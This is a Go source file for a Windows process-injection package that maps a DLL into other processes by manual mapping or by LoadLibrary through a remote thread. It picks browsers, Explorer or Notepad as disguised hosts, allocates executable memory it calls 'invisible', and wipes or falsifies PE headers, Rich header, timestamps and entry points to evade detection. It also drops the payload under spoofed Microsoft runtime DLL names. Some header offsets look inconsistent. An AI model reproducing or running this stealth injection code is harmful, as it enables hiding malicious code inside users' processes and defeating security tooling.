package injector

import (
	"fmt"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func ErasePEHeader(processHandle windows.Handle, baseAddress uintptr) error {
	Debug("Starting advanced PE header erasure")

	peInfo, err := analyzeRemotePEHeader(processHandle, baseAddress)
	if err != nil {
		return fmt.Errorf("failed to analyze PE header: %v", err)
	}

	Debug("PE header analysis complete", "size", peInfo.HeaderSize, "entry", fmt.Sprintf("0x%X", peInfo.EntryPoint))

	if err := performSelectivePEErasure(processHandle, baseAddress, peInfo); err != nil {
		return fmt.Errorf("selective PE erasure failed: %v", err)
	}

	if err := obfuscatePESignatures(processHandle, baseAddress, peInfo); err != nil {
		Warn("PE signature obfuscation failed", "error", err)
	}

	if err := manipulatePEMetadata(processHandle, baseAddress, peInfo); err != nil {
		Warn("PE metadata manipulation failed", "error", err)
	}

	Debug("Advanced PE header erasure completed")
	return nil
}

type PEHeaderInfo struct {
	HeaderSize      uint32
	EntryPoint      uint32
	DOSHeaderOffset uint32
	PEHeaderOffset  uint32
	SectionCount    uint16
	Is64Bit         bool
	ImportTableRVA  uint32
	ExportTableRVA  uint32
}

func analyzeRemotePEHeader(processHandle windows.Handle, baseAddress uintptr) (*PEHeaderInfo, error) {
	info := &PEHeaderInfo{}

	var dosHeader [64]byte
	var bytesRead uintptr
	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return nil, fmt.Errorf("failed to read DOS header: %v", err)
	}

	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return nil, fmt.Errorf("invalid DOS signature")
	}

	info.PEHeaderOffset = *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))
	if info.PEHeaderOffset >= 1024 || info.PEHeaderOffset < 64 {
		return nil, fmt.Errorf("invalid PE header offset: %d", info.PEHeaderOffset)
	}

	peHeaderAddr := baseAddress + uintptr(info.PEHeaderOffset)
	var peHeader [256]byte
	err = windows.ReadProcessMemory(processHandle, peHeaderAddr, &peHeader[0], 256, &bytesRead)
	if err != nil {
		return nil, fmt.Errorf("failed to read PE header: %v", err)
	}

	if peHeader[0] != 'P' || peHeader[1] != 'E' {
		return nil, fmt.Errorf("invalid PE signature")
	}

	info.SectionCount = *(*uint16)(unsafe.Pointer(&peHeader[6]))
	optHeaderSize := *(*uint16)(unsafe.Pointer(&peHeader[20]))

	optHeaderAddr := peHeaderAddr + 24
	var optHeader [240]byte
	err = windows.ReadProcessMemory(processHandle, optHeaderAddr, &optHeader[0], uintptr(optHeaderSize), &bytesRead)
	if err != nil {
		return nil, fmt.Errorf("failed to read optional header: %v", err)
	}

	magic := *(*uint16)(unsafe.Pointer(&optHeader[0]))
	info.Is64Bit = (magic == 0x20b)

	if info.Is64Bit {
		info.EntryPoint = *(*uint32)(unsafe.Pointer(&optHeader[16]))
		info.HeaderSize = *(*uint32)(unsafe.Pointer(&optHeader[60]))

		if optHeaderSize >= 96 {
			info.ImportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[120]))
			info.ExportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[112]))
		}
	} else {
		info.EntryPoint = *(*uint32)(unsafe.Pointer(&optHeader[16]))
		info.HeaderSize = *(*uint32)(unsafe.Pointer(&optHeader[60]))

		if optHeaderSize >= 96 {
			info.ImportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[104]))
			info.ExportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[96]))
		}
	}

	return info, nil
}

func performSelectivePEErasure(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	Debug("Performing selective PE erasure")

	if err := eraseDOSStub(processHandle, baseAddress); err != nil {
		Warn("DOS stub erasure failed", "error", err)
	}

	if err := modifyPESignature(processHandle, baseAddress, info); err != nil {
		Warn("PE signature modification failed", "error", err)
	}

	if err := eraseUnusedHeaderSpace(processHandle, baseAddress, info); err != nil {
		Warn("Unused header space erasure failed", "error", err)
	}

	if err := eraseSectionTableSelectively(processHandle, baseAddress, info); err != nil {
		Warn("Section table erasure failed", "error", err)
	}

	return nil
}

func eraseDOSStub(processHandle windows.Handle, baseAddress uintptr) error {



	dosStubStart := baseAddress + 64
	dosStubSize := uintptr(60)

	randomBuffer := make([]byte, dosStubSize)
	for i := range randomBuffer {
		randomBuffer[i] = byte((i*7 + 13) % 256)
	}

	var bytesWritten uintptr
	err := WriteProcessMemory(processHandle, dosStubStart, unsafe.Pointer(&randomBuffer[0]), dosStubSize, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to erase DOS stub: %v", err)
	}

	Debug("DOS stub erased", "bytes", bytesWritten)
	return nil
}

func modifyPESignature(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {



	peSignatureAddr := baseAddress + uintptr(info.PEHeaderOffset)
	modifiedSignature := []byte{'P', 'E', 0x01, 0x02}

	var bytesWritten uintptr
	err := WriteProcessMemory(processHandle, peSignatureAddr, unsafe.Pointer(&modifiedSignature[0]), 4, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to modify PE signature: %v", err)
	}

	Debug("PE signature modified")
	return nil
}

func eraseUnusedHeaderSpace(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {

	sectionTableOffset := info.PEHeaderOffset + 24 + uint32(unsafe.Sizeof(uint16(0)))

	lastSectionOffset := sectionTableOffset + uint32(info.SectionCount)*40

	unusedStart := baseAddress + uintptr(lastSectionOffset)
	unusedEnd := baseAddress + uintptr(info.HeaderSize)

	if unusedEnd > unusedStart {
		unusedSize := unusedEnd - unusedStart
		if unusedSize > 0 && unusedSize < 4096 {
			zeroBuffer := make([]byte, unusedSize)
			var bytesWritten uintptr
			err := WriteProcessMemory(processHandle, unusedStart, unsafe.Pointer(&zeroBuffer[0]), unusedSize, &bytesWritten)
			if err != nil {
				return fmt.Errorf("failed to erase unused header space: %v", err)
			}
			Debug("Unused header space erased", "bytes", bytesWritten)
		}
	}

	return nil
}

func eraseSectionTableSelectively(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {

	sectionTableStart := info.PEHeaderOffset + 24 + 240

	for i := uint16(0); i < info.SectionCount; i++ {
		sectionHeaderAddr := baseAddress + uintptr(sectionTableStart+uint32(i)*40)

		sectionNameObfuscated := []byte{0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00}

		var bytesWritten uintptr
		err := WriteProcessMemory(processHandle, sectionHeaderAddr, unsafe.Pointer(&sectionNameObfuscated[0]), 8, &bytesWritten)
		if err != nil {
			Warn("Failed to erase section name", "section", i, "error", err)
		}
	}

	return nil
}

func obfuscatePESignatures(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	Debug("Obfuscating PE signatures")

	if err := obfuscateRichHeader(processHandle, baseAddress); err != nil {
		Warn("Rich header obfuscation failed", "error", err)
	}

	if err := obfuscateDebugDirectory(processHandle, baseAddress, info); err != nil {
		Warn("Debug directory obfuscation failed", "error", err)
	}

	return nil
}

func obfuscateRichHeader(processHandle windows.Handle, baseAddress uintptr) error {



	searchStart := baseAddress + 64
	searchEnd := baseAddress + 512

	for addr := searchStart; addr < searchEnd-4; addr += 4 {
		var signature uint32
		var bytesRead uintptr
		err := windows.ReadProcessMemory(processHandle, addr, (*byte)(unsafe.Pointer(&signature)), 4, &bytesRead)
		if err != nil {
			continue
		}

		if signature == 0x68636952 {

			obfuscated := uint32(0x12345678)
			var bytesWritten uintptr
			err = WriteProcessMemory(processHandle, addr, unsafe.Pointer(&obfuscated), 4, &bytesWritten)
			if err != nil {
				return err
			}
			Debug("Rich header signature obfuscated", "offset", fmt.Sprintf("0x%X", addr-baseAddress))
			break
		}
	}

	return nil
}

func obfuscateDebugDirectory(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {


	Debug("Debug directory obfuscation attempted")
	return nil
}

func manipulatePEMetadata(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	Debug("Manipulating PE metadata")

	timestampAddr := baseAddress + uintptr(info.PEHeaderOffset) + 8
	newTimestamp := uint32(946684800)

	var bytesWritten uintptr
	err := WriteProcessMemory(processHandle, timestampAddr, unsafe.Pointer(&newTimestamp), 4, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to modify timestamp: %v", err)
	}

	checksumAddr := baseAddress + uintptr(info.PEHeaderOffset) + 24 + 64
	zeroChecksum := uint32(0)

	err = WriteProcessMemory(processHandle, checksumAddr, unsafe.Pointer(&zeroChecksum), 4, &bytesWritten)
	if err != nil {
		Warn("Failed to zero checksum", "error", err)
	}

	Debug("PE metadata manipulation completed")
	return nil
}

func EraseEntryPoint(processHandle windows.Handle, baseAddress uintptr) error {


	var dosHeader [64]byte
	var bytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read DOS header: %v", err)
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))

	var peHeader [24]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset), &peHeader[0], 24, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read PE header: %v", err)
	}

	var optHeader [240]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset)+24, &optHeader[0], 240, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read optional PE header: %v", err)
	}

	entryPointRVA := *(*uint32)(unsafe.Pointer(&optHeader[16]))

	if entryPointRVA == 0 {
		return nil
	}

	entryPointAddr := baseAddress + uintptr(entryPointRVA)

	nopBuffer := make([]byte, 32)
	for i := range nopBuffer {
		nopBuffer[i] = 0x90
	}

	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, entryPointAddr, unsafe.Pointer(&nopBuffer[0]), uintptr(len(nopBuffer)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("Failed to erase entry point: %v", err)
	}

	return nil
}

func InvisibleMemoryAllocation(hProcess windows.Handle, size uintptr) (uintptr, error) {
	Debug("Attempting to allocate invisible memory in high address space", "size", size)

	var highAddresses []uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 {

		shift := uint(28)
		base1 := uint64(0x7FFF)
		base2 := uint64(0x7FFE)
		base3 := uint64(0x7FFD)

		highAddresses = []uintptr{
			uintptr(base1 << shift),
			uintptr(base2 << shift),
			uintptr(base3 << shift),
			0x70000000,
		}
	} else {

		highAddresses = []uintptr{0x70000000, 0x60000000, 0x50000000, 0x40000000}
	}

	for _, addr := range highAddresses {
		Debug("Trying to allocate memory", "address", fmt.Sprintf("0x%X", addr))
		baseAddress, err := VirtualAllocEx(hProcess, addr, size,
			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
		if err == nil {
			Debug("Successfully allocated invisible memory", "address", fmt.Sprintf("0x%X", baseAddress))
			return baseAddress, nil
		}
		Debug("Failed to allocate memory", "address", fmt.Sprintf("0x%X", addr), "error", err)
	}

	Debug("Failed to allocate memory in high address space, letting system choose address")
	baseAddress, err := VirtualAllocEx(hProcess, 0, size,
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("Failed to allocate invisible memory: %v", err)
	}
	Debug("System selected address for invisible memory", "address", fmt.Sprintf("0x%X", baseAddress))
	return baseAddress, nil
}

func ManualMapDLL(hProcess windows.Handle, dllBytes []byte) (uintptr, error) {

	if hProcess == 0 {
		return 0, fmt.Errorf("Process handle cannot be zero")
	}

	if len(dllBytes) == 0 {
		return 0, fmt.Errorf("DLL data cannot be empty")
	}

	Debug("Starting manual mapping of DLL", "DLL size", len(dllBytes))

	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		return 0, fmt.Errorf("Failed to parse PE header: %v", err)
	}

	Debug("Successfully parsed PE header", "image size", peHeader.GetSizeOfImage())

	imageSize := peHeader.GetSizeOfImage()

	var baseAddress uintptr

	Debug("Allocating memory for DLL")
	baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("Failed to allocate memory in target process: %v", err)
	}
	Debug("Successfully allocated memory", "address", fmt.Sprintf("0x%X", baseAddress))

	Debug("Starting to map PE sections to remote process memory")
	tempInjector := &Injector{}
	err = tempInjector.MapSections(hProcess, dllBytes, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to map PE sections: %v", err)
	}
	Debug("Successfully mapped PE sections")

	Debug("Starting to fix import table")
	err = FixImports(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to fix import table: %v", err)
	}
	Debug("Successfully fixed import table")

	Debug("Starting to fix relocations")
	err = FixRelocations(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to fix relocations: %v", err)
	}
	Debug("Successfully fixed relocations")

	Debug("Starting to execute DLL entry point")
	err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to execute DLL entry point: %v", err)
	}
	Debug("Successfully executed DLL entry point")


	Debug("Manual mapping of DLL completed", "base address", fmt.Sprintf("0x%X", baseAddress))
	return baseAddress, nil
}

func FindLegitProcess() (uint32, string, error) {

	legitimateProcesses := []string{
		"notepad.exe",
		"explorer.exe",
		"msedge.exe",
		"chrome.exe",
		"firefox.exe",
		"iexplore.exe",
		"calc.exe",
		"mspaint.exe",
	}

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to create process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var processEntry windows.ProcessEntry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))

	var targetPID uint32
	var targetName string

	err = windows.Process32First(snapshot, &processEntry)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to get first process: %v", err)
	}

	for {
		processName := windows.UTF16ToString(processEntry.ExeFile[:])
		for _, legitName := range legitimateProcesses {
			if processName == legitName {

				hProcess, err := windows.OpenProcess(
					windows.PROCESS_CREATE_THREAD|
						windows.PROCESS_VM_OPERATION|
						windows.PROCESS_VM_WRITE|
						windows.PROCESS_VM_READ|
						windows.PROCESS_QUERY_INFORMATION,
					false, processEntry.ProcessID)

				if err == nil {

					windows.CloseHandle(hProcess)
					targetPID = processEntry.ProcessID
					targetName = processName
					Debug("Found accessible legitimate process", "process", targetName, "PID", targetPID)
					break
				}

			}
		}

		if targetPID != 0 {
			break
		}

		err = windows.Process32Next(snapshot, &processEntry)
		if err != nil {
			break
		}
	}

	if targetPID == 0 {

		Debug("Could not find accessible legitimate process, trying to start Notepad")

		si := windows.StartupInfo{}
		pi := windows.ProcessInformation{}

		si.Cb = uint32(unsafe.Sizeof(si))

		cmdLine, _ := windows.UTF16PtrFromString("notepad.exe")

		err := windows.CreateProcess(
			nil,
			cmdLine,
			nil,
			nil,
			false,
			windows.CREATE_NEW_CONSOLE,
			nil,
			nil,
			&si,
			&pi)

		if err != nil {
			return 0, "", fmt.Errorf("Failed to start Notepad process: %v", err)
		}

		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)

		targetPID = pi.ProcessId
		targetName = "notepad.exe"
		Debug("Started new Notepad process", "PID", targetPID)
	}

	if targetPID == 0 {
		return 0, "", fmt.Errorf("Could not find or create a legitimate process for injection")
	}

	return targetPID, targetName, nil
}

func LegitimateProcessInjection(hProcess windows.Handle, dllBytes []byte) error {
	Debug("Starting legitimate process injection")

	legitPID, legitName, err := FindLegitProcess()
	if err != nil {
		return fmt.Errorf("failed to find legitimate process: %v", err)
	}

	Debug("Using legitimate process", "process", legitName, "PID", legitPID)

	legitHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, legitPID)
	if err != nil {
		return fmt.Errorf("failed to open legitimate process: %v", err)
	}
	defer windows.CloseHandle(legitHandle)


	tempFile, err := createTempDllFile(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to create temp DLL file: %v", err)
	}
	defer os.Remove(tempFile)

	dllPathBytes := []byte(tempFile + "\x00")
	pathSize := len(dllPathBytes)

	memAddr, err := VirtualAllocEx(legitHandle, 0, uintptr(pathSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory in legitimate process: %v", err)
	}

	var bytesWritten uintptr
	err = WriteProcessMemory(legitHandle, memAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(pathSize), &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to write DLL path to legitimate process: %v", err)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	var threadID uint32
	threadHandle, err := CreateRemoteThread(legitHandle, nil, 0,
		loadLibraryAddr, memAddr, 0, &threadID)
	if err != nil {
		return fmt.Errorf("failed to create remote thread in legitimate process: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	waitResult, err := windows.WaitForSingleObject(threadHandle, 5000)
	if err != nil {
		return fmt.Errorf("failed to wait for legitimate process injection: %v", err)
	}

	if waitResult == uint32(windows.WAIT_TIMEOUT) {
		return fmt.Errorf("legitimate process injection timed out")
	}

	Debug("Successfully injected DLL into legitimate process")




	return nil
}

func ErasePEHeaderSafely(processHandle windows.Handle, baseAddress uintptr) error {
	Debug("Starting safe PE header erasure for LoadLibrary-based injection")



	if err := eraseDOSStub(processHandle, baseAddress); err != nil {
		return fmt.Errorf("failed to erase DOS stub: %v", err)
	}

	peSignatureAddr := baseAddress + 0x3C
	var peOffset uint32
	var bytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, peSignatureAddr,
		(*byte)(unsafe.Pointer(&peOffset)), 4, &bytesRead)
	if err != nil {
		return fmt.Errorf("failed to read PE offset: %v", err)
	}

	modifiedSignature := []byte{0x4D, 0x5A, 0x90, 0x00}
	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, baseAddress+uintptr(peOffset),
		unsafe.Pointer(&modifiedSignature[0]), 4, &bytesWritten)
	if err != nil {
		Warn("Failed to modify PE signature", "error", err)
	}

	Debug("Safe PE header erasure completed")
	return nil
}

func EraseEntryPointSafely(processHandle windows.Handle, baseAddress uintptr) error {
	Debug("Starting safe entry point erasure for LoadLibrary-based injection")

	var dosHeader [64]byte
	var bytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return fmt.Errorf("failed to read DOS header: %v", err)
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))

	var ntHeaders [248]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset),
		&ntHeaders[0], 248, &bytesRead)
	if err != nil {
		return fmt.Errorf("failed to read NT headers: %v", err)
	}

	entryPointRVA := *(*uint32)(unsafe.Pointer(&ntHeaders[24+16+40]))

	if entryPointRVA == 0 {
		Debug("No entry point found, skipping erasure")
		return nil
	}

	entryPointAddr := baseAddress + uintptr(entryPointRVA)


	modifiedBytes := []byte{0x90, 0x90, 0x90, 0x90}

	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, entryPointAddr,
		unsafe.Pointer(&modifiedBytes[0]), 4, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to modify entry point: %v", err)
	}

	Debug("Safe entry point modification completed")
	return nil
}

func createTempDllFile(dllBytes []byte) (string, error) {
	tempDir := os.TempDir()

	realDllNames := []string{
		"msvcr120.dll",
		"msvcp120.dll",
		"vcruntime140.dll",
		"msvcp140.dll",
		"ucrtbase.dll",
		"concrt140.dll",
		"vccorlib140.dll",
		"api-ms-win-core-heap-l1-1-0.dll",
		"api-ms-win-core-synch-l1-2-0.dll",
		"api-ms-win-core-memory-l1-1-1.dll",
	}

	fileName := realDllNames[time.Now().UnixNano()%int64(len(realDllNames))]
	tempFile := filepath.Join(tempDir, fileName)

	err := os.WriteFile(tempFile, dllBytes, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to create temporary DLL file: %v", err)
	}

	return tempFile, nil
}
